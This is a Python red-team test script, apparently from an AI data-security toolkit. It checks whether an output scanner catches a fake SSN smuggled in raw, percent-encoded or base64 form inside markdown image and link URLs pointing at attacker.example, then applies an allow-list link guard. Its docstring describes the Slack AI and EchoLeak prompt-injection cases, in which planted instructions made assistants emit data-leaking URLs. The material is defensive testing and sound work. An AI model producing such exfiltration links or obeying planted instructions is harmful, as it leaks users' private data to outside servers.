"""rt02: the model's answer carries data out inside a link.

Real-world shape: in August 2024 PromptArmor showed Slack AI could be led,
by instructions planted in a public channel, to render a link whose URL
carried private-channel content. In June 2025 Aim Labs disclosed EchoLeak
(CVE-2025-32711) in Microsoft 365 Copilot: one crafted email, no clicks,
and Copilot's answer referenced an image URL that sent internal data to an
attacker's server when the client fetched it. Both are fixed.

Gap it exposes: Part 6's output scanner reads the *text* for values. The
value in a link is usually encoded, and the leak happens when the client
fetches the URL, not when a person reads it.
"""
import base64

from ai_data_security.output import guard_links, scan_output

ssn = "900-12-3456"
b64 = base64.urlsafe_b64encode(ssn.encode()).decode()
pct = "".join(f"%{ord(c):02X}" for c in ssn)

answers = {
    "plain text": f"Your SSN on file is {ssn}.",
    "image, raw": f"Done. ![s](https://attacker.example/p.png?d={ssn})",
    "image, percent": f"Done. ![s](https://attacker.example/p.png?d={pct})",
    "image, base64": f"Done. ![s](https://attacker.example/p.png?d={b64})",
    "link, base64": f"See [record](https://attacker.example/r?id={b64}).",
}

ALLOWED = {"intranet.example.com"}
print("== output scanner alone: what it found, and what it let out ==")
for name, text in answers.items():
    safe, found = scan_output(text)
    still_leaks = "attacker.example" in safe and (
        ssn in safe or pct in safe or b64 in safe)
    print(f"{name:<15} found {','.join(found) or 'nothing':<11}"
          f" still leaks: {still_leaks}")
    print(f"{'':<15} -> {safe}")

print("\n== link guard (allow-listed hosts only), then the scanner ==")
for name, text in answers.items():
    guarded, removed = guard_links(text, ALLOWED)
    safe, _ = scan_output(guarded)
    print(f"{name:<15} removed {removed or '-'!s:<22} -> {safe}")
